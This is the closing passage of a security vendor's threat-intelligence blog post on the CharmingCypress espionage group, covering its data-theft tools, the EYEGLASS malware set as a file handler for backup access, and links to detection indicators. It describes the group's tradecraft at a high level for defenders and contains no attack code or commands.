<p style="font-weight: 400;">In the same investigation, Volexity identified additional tools used by CharmingCypress to facilitate data theft:</p>
<ul>
<li>Nirsoft <a href="https://www.nirsoft.net/utils/chrome_history_view.html">Chrome History Viewer</a></li>
<li><a href="https://github.com/rapiz1/rathole">RATHOLE</a></li>
<li><a href="https://github.com/snail007/goproxy">SNAILPROXY</a></li>
<li><a href="https://github.com/tedburke/CommandCam">CommandCam</a></li>
<li>Command-line copies of WinRAR and 7-Zip</li>
</ul>
<p style="font-weight: 400;">Volexity also identified a copy of EYEGLASS, the malware documented in a <a href="https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/">recent Microsoft post</a> under the <em>MediaPl backdoor</em> section. In the case investigated by Volexity, EYEGLASS had been set up as the default handler for the TIF file extension. Encountering TIF files as part of the targeted user's day-to-day work would be unusual, and it is unlikely the attacker would want to randomly display a TIF on an already-infected device. Based on available evidence, Volexity assesses with high confidence that EYEGLASS was intended only as a backup C2 mechanism. In this scenario, if CharmingCypress lost access to the victim machine, they would try sending the user a specially crafted TIF file in order to regain access to the device if the user opened the file.</p>
<h2>Conclusion</h2>
<p style="font-weight: 400;">This blog post describes targeted campaigns that reveal a high level of effort CharmingCypress is willing to dedicate to support their spear-phishing operations. This threat actor is highly committed to conducting surveillance on their targets in order to determine how best to manipulate them and deploy malware. Additionally, few other threat actors have consistently churned out as many campaigns as CharmingCypress, dedicating human operators to support their ongoing efforts.</p>
<p style="font-weight: 400;">For those targeted by CharmingCypress, such as journalists, activists, academics, and policy experts, it is crucial to understand that CharmingCypress is persistent. This threat actor is willing to modify their techniques on a regular basis in order to maximize their chances of compromising specific targets.</p>
<p style="font-weight: 400;">For threat intelligence readers, this blog post firmly links NOKNOK and POWERLESS to recent CharmingCypress spear-phishing activity and adds documentation regarding the BASICSTAR backdoor. This cluster has previously used the <a href="https://www.volexity.com/blog/2023/06/28/charming-kitten-updates-powerstar-with-an-interplanetary-twist/">POWERSTAR</a> malware family during similar operations.</p>
<p style="font-weight: 400;">Related indicators to detect and investigate these attacks can also be downloaded from the Volexity GitHub page:</p>
<ul>
<li><a href="https://github.com/volexity/threat-intel/blob/main/2024/2024-02-13%20CharmingCypress/rules.yar">YARA rules</a></li>
<li><a href="https://github.com/volexity/threat-intel/blob/main/2024/2024-02-13%20CharmingCypress/iocs.csv">Single value indicators</a></li>
</ul>
<blockquote>
<p style="font-weight: 400;"><em>Volexity's Threat Intelligence research, such as the content from this blog, is published to customers via its </em><a href="https://www.volexity.com/services-overview/threat-intelligence/"><em>Threat Intelligence Service</em></a><em>. The activity described in this blog post was shared with Volexity Threat Intelligence customers throughout 2023 and in January 2024.<br />
</em></p>
<p>&nbsp;</p>
<p style="font-weight: 400;"><em>If you are interested in learning more about Volexity’s services or leading memory forensics solutions, </em><a href="https://www.volexity.com/products-overview/surge/"><em>Volexity Surge Collect Pro</em></a><em> for memory acquisition and </em><a href="https://www.volexity.com/products-overview/volcano/"><em>Volexity Volcano</em></a><em> for memory analysis, please do not hesitate to </em><a href="https://www.volexity.com/company/contact/"><em>contact us</em></a><em>.</em></p>
</blockquote>
				<div class="post-tags">
					<a href="https://www.volexity.com/blog/tag/apt/">APT</a>, <a href="https://www.volexity.com/blog/tag/apt42/">apt42</a>, <a href="https://www.volexity.com/blog/tag/charming-kitten/">charming kitten</a>, <a href="https://www.volexity.com/blog/tag/charmingcypress/">charmingcypress</a>, <a href="https://www.volexity.com/blog/tag/iran/">iran</a>, <a href="https://www.volexity.com/blog/tag/memory-analysis/">memory analysis</a>, <a href="https://www.volexity.com/blog/tag/memory-forensics/">memory forensics</a>, <a href="https://www.volexity.com/blog/tag/phishing/">phishing</a>, <a href="https://www.volexity.com/blog/tag/ta453/">ta453</a>, <a href="https://www.volexity.com/blog/tag/volexity-volcano/">volexity volcano</a>				</div>
			</div>

		</article>

		<aside class="sidebar col-sm-4">
	<ul class="widgets">
		<li class="widget widget_search"><div class="widget-content"><form role="search" method="get" class="search-form" action="https://www.volexity.com/">
    <label>
        <span class="screen-reader-text">Search for:</span>
        <input type="search" class="search-field"
               placeholder="SEARCH"
               value="" name="s"
               title="Search for:" />
    </label>
    <input type="submit" class="search-submit"
           value="Search" />
</form></div></li>
		<li class="widget widget_recent_entries"><div class="widget-content">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://www.volexity.com/blog/2024/08/02/stormbamboo-compromises-isp-to-abuse-insecure-software-update-mechanisms/">StormBamboo Compromises ISP to Abuse Insecure Software Update Mechanisms</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/">DISGOMOJI Malware Used to Target Indian Government</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/05/15/detecting-compromise-of-cve-2024-3400-on-palo-alto-networks-globalprotect-devices/">Detecting Compromise of CVE-2024-3400 on Palo Alto Networks GlobalProtect Devices</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/">Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/02/13/charmingcypress-innovating-persistence/" aria-current="page">CharmingCypress: Innovating Persistence</a>
									</li>
					</ul>

		</div></li><li class="widget widget_archive"><div class="widget-content"><h4 class="widget-title">Archives</h4>
			<ul>
					<li><a href='https://www.volexity.com/blog/2024/08/'>August 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/06/'>June 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/05/'>May 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/04/'>April 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/02/'>February 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/01/'>January 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2023/09/'>September 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2023/06/'>June 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2023/03/'>March 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2022/12/'>December 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/08/'>August 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/07/'>July 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/06/'>June 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/03/'>March 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/02/'>February 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2021/12/'>December 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/08/'>August 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/05/'>May 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/03/'>March 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2020/12/'>December 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/11/'>November 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/04/'>April 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/03/'>March 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2019/09/'>September 2019</a></li>
	<li><a href='https://www.volexity.com/blog/2018/11/'>November 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/09/'>September 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/08/'>August 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/07/'>July 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/06/'>June 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/04/'>April 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2017/11/'>November 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2017/07/'>July 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2017/03/'>March 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2016/11/'>November 2016</a></li>
	<li><a href='https://www.volexity.com/blog/2015/10/'>October 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/07/'>July 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/06/'>June 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/04/'>April 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2014/10/'>October 2014</a></li>
	<li><a href='https://www.volexity.com/blog/2014/09/'>September 2014</a></li>
			</ul>

			</div></li><li class="widget widget_categorizedtagcloudwidget"><div class="widget-content"><h4 class="widget-title">Tags</h4>
    <div id="categorized-tag-cloud"><span id="categorized-tag-cloud-el-1"><a href="https://www.volexity.com/blog/tag/apt/" class="tag-cloud-link tag-link-35 tag-link-position-1" style="font-size: 20pt;" aria-label="APT (36 items)">APT</a></span> <span id="categorized-tag-cloud-el-2"><a href="https://www.volexity.com/blog/tag/osx/" class="tag-cloud-link tag-link-49 tag-link-position-2" style="font-size: 10pt;" aria-label="osx (3 items)">osx</a></span> <span id="categorized-tag-cloud-el-3"><a href="https://www.volexity.com/blog/tag/malware/" class="tag-cloud-link tag-link-106 tag-link-position-3" style="font-size: 11.855670103093pt;" aria-label="malware (5 items)">malware</a></span> <span id="categorized-tag-cloud-el-4"><a href="https://www.volexity.com/blog/tag/exploits/" class="tag-cloud-link tag-link-33 tag-link-position-4" style="font-size: 14.948453608247pt;" aria-label="exploits (11 items)">exploits</a></span> <span id="categorized-tag-cloud-el-5"><a href="https://www.volexity.com/blog/tag/0day/" class="tag-cloud-link tag-link-131 tag-link-position-5" style="font-size: 11.855670103093pt;" aria-label="0day (5 items)">0day</a></span> <span id="categorized-tag-cloud-el-6"><a href="https://www.volexity.com/blog/tag/pulsesecure/" class="tag-cloud-link tag-link-172 tag-link-position-6" style="font-size: 11.030927835052pt;" aria-label="pulsesecure (4 items)">pulsesecure</a></span> <span id="categorized-tag-cloud-el-7"><a href="https://www.volexity.com/blog/tag/memory-forensics/" class="tag-cloud-link tag-link-65 tag-link-position-7" style="font-size: 11.855670103093pt;" aria-label="memory forensics (5 items)">memory forensics</a></span> <span id="categorized-tag-cloud-el-8"><a href="https://www.volexity.com/blog/tag/spear-phishing/" class="tag-cloud-link tag-link-45 tag-link-position-8" style="font-size: 11.030927835052pt;" aria-label="spear phishing (4 items)">spear phishing</a></span> <span id="categorized-tag-cloud-el-9"><a href="https://www.volexity.com/blog/tag/china/" class="tag-cloud-link tag-link-42 tag-link-position-9" style="font-size: 14.123711340206pt;" aria-label="China (9 items)">China</a></span> <span id="categorized-tag-cloud-el-10"><a href="https://www.volexity.com/blog/tag/rce/" class="tag-cloud-link tag-link-174 tag-link-position-10" style="font-size: 12.577319587629pt;" aria-label="RCE (6 items)">RCE</a></span> <span id="categorized-tag-cloud-el-11"><a href="https://www.volexity.com/blog/tag/phishing/" class="tag-cloud-link tag-link-107 tag-link-position-11" style="font-size: 10pt;" aria-label="phishing (3 items)">phishing</a></span> <span id="categorized-tag-cloud-el-12"><a href="https://www.volexity.com/blog/tag/scanning/" class="tag-cloud-link tag-link-31 tag-link-position-12" style="font-size: 11.030927835052pt;" aria-label="Scanning (4 items)">Scanning</a></span> <span id="categorized-tag-cloud-el-13"><a href="https://www.volexity.com/blog/tag/exploit/" class="tag-cloud-link tag-link-87 tag-link-position-13" style="font-size: 15.257731958763pt;" aria-label="Exploit (12 items)">Exploit</a></span> <span id="categorized-tag-cloud-el-14"><a href="https://www.volexity.com/blog/tag/vulnerabilities/" class="tag-cloud-link tag-link-34 tag-link-position-14" style="font-size: 11.030927835052pt;" aria-label="vulnerabilities (4 items)">vulnerabilities</a></span> <span id="categorized-tag-cloud-el-15"><a href="https://www.volexity.com/blog/tag/ivanti-connect-secure/" class="tag-cloud-link tag-link-173 tag-link-position-15" style="font-size: 11.030927835052pt;" aria-label="ivanti connect secure (4 items)">ivanti connect secure</a></span> <span id="categorized-tag-cloud-el-16"><a href="https://www.volexity.com/blog/tag/threat-intelligence/" class="tag-cloud-link tag-link-93 tag-link-position-16" style="font-size: 11.855670103093pt;" aria-label="Threat Intelligence (5 items)">Threat Intelligence</a></span> <span id="categorized-tag-cloud-el-17"><a href="https://www.volexity.com/blog/tag/crimeware/" class="tag-cloud-link tag-link-68 tag-link-position-17" style="font-size: 10pt;" aria-label="crimeware (3 items)">crimeware</a></span> <span id="categorized-tag-cloud-el-18"><a href="https://www.volexity.com/blog/tag/vpn/" class="tag-cloud-link tag-link-24 tag-link-position-18" style="font-size: 11.855670103093pt;" aria-label="VPN (5 items)">VPN</a></span> <span id="categorized-tag-cloud-el-19"><a href="https://www.volexity.com/blog/tag/webshell/" class="tag-cloud-link tag-link-84 tag-link-position-19" style="font-size: 11.855670103093pt;" aria-label="webshell (5 items)">webshell</a></span> <span id="categorized-tag-cloud-el-20"><a href="https://www.volexity.com/blog/tag/north-korea/" class="tag-cloud-link tag-link-117 tag-link-position-20" style="font-size: 11.855670103093pt;" aria-label="North Korea (5 items)">North Korea</a></span> </div>
  	<style>
  	
  		#categorized-tag-cloud a, #categorized-tag-cloud a:visited { text-decoration:none; }
      #categorized-tag-cloud a:hover { text-decoration:none; color:#3b97d3; }
    		#categorized-tag-cloud-el-1 a, #categorized-tag-cloud-el-1 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-2 a, #categorized-tag-cloud-el-2 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-3 a, #categorized-tag-cloud-el-3 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-4 a, #categorized-tag-cloud-el-4 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-5 a, #categorized-tag-cloud-el-5 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-6 a, #categorized-tag-cloud-el-6 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-7 a, #categorized-tag-cloud-el-7 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-8 a, #categorized-tag-cloud-el-8 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-9 a, #categorized-tag-cloud-el-9 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-10 a, #categorized-tag-cloud-el-10 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-11 a, #categorized-tag-cloud-el-11 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-12 a, #categorized-tag-cloud-el-12 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-13 a, #categorized-tag-cloud-el-13 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-14 a, #categorized-tag-cloud-el-14 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-15 a, #categorized-tag-cloud-el-15 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-16 a, #categorized-tag-cloud-el-16 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-17 a, #categorized-tag-cloud-el-17 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-18 a, #categorized-tag-cloud-el-18 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-19 a, #categorized-tag-cloud-el-19 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-20 a, #categorized-tag-cloud-el-20 a:visited { color:#555555; }
  	</style></div></li>	</ul>
</aside>	</section>
</div>	</main>

	<footer class="footer">
	<div class="footer-container container">
        <div class="footer-col-first col-md-3 no-padding">
            <a class="footer-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
            <address class="footer-copyright">&copy; 2024 Volexity. All Rights Reserved.</address>
        </div>
		<ul id="menu-footer-menu" class="footer-menu-list col-md-4 col-xs-12"><li id="menu-item-57" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-57"><a href="/company/about/">About</a>
<ul class="sub-menu">
	<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="https://www.volexity.com/company/about/">About Us</a></li>
	<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-58"><a href="https://www.volexity.com/blog/">Blog</a></li>
	<li id="menu-item-395" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-395"><a href="https://www.volexity.com/privacy-policy/">Privacy Policy</a></li>
</ul>
</li>
<li id="menu-item-60" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-60"><a href="/solutions/">Solutions</a>
<ul class="sub-menu">
	<li id="menu-item-400" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-400"><a href="https://www.volexity.com/company/contact/">Request A Demo</a></li>
	<li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.volexity.com/products-overview/">Products</a></li>
	<li id="menu-item-669" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-669"><a href="https://www.volexity.com/services-overview/">Services</a></li>
</ul>
</li>
</ul>
        <div class="footer-address col-md-3 col-xs-12">
            <p class="footer-header">Contact</p>
            <ul>
                <li class="footer-address--address icon-location-marker">
                    11654 Plaza America Dr #774<br />
                    Reston, VA 20190-4700                </li>
                <li class="footer-address--phone icon-phone-mobile">1-888-825-1975</li>
            </ul>
        </div>
        <div class="footer-social col-md-2 no-padding">
            <p class="footer-header">Connect</p>
            <ul>
                <li class="footer-social-holder"><a href="https://www.facebook.com/volexity" target="_blank" class="icon-facebook footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://twitter.com/volexity" target="_blank" class="icon-twitter footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://www.linkedin.com/company/volexity" target="_blank" class="icon-linkedin footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://infosec.exchange/@volexity" target="_blank" class="fa-mastodon footer-social--link"></a></li>
            </ul>
        </div>
	</div>
    <div id="back-to-top" class="icon-slide-left"></div>
	<script type="text/javascript" id="main-js-extra">
/* <![CDATA[ */
var urls = {"base":"https:\/\/www.volexity.com","theme":"https:\/\/www.volexity.com\/wp-content\/themes\/volexity","ajax":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php"};
var info = [];
/* ]]> */
</script>
<script type="text/javascript" src="https://www.volexity.com/wp-content/themes/volexity/dist/scripts/scripts.min.js?ver=6.6.2" id="main-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/comment-reply.min.js?ver=6.6.2" id="comment-reply-js" async="async" data-wp-strategy="async"></script>

		<!-- Cookie Notice plugin v2.4.18 by Hu-manity.co https://hu-manity.co/ -->
		<div id="cookie-notice" role="dialog" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: rgba(0,0,0,1);"><div class="cookie-notice-container" style="color: #fff"><span id="cn-notice-text" class="cn-text-container">This Website uses cookies, which are necessary to its functioning and required to achieve the purposes illustrated in our <a href="/privacy-policy/#cookies">Cookie Policy</a>. By clicking the button, you consent to our use of cookies.</span><span id="cn-notice-buttons" class="cn-buttons-container"><a href="#" id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button cn-button-custom box-cta" aria-label="Agree &amp; Close">Agree &amp; Close</a></span><span id="cn-close-notice" data-cookie-set="accept" class="cn-close-icon" title="No"></span></div>
			
		</div>
		<!-- / Cookie Notice plugin --></footer></body>
</html>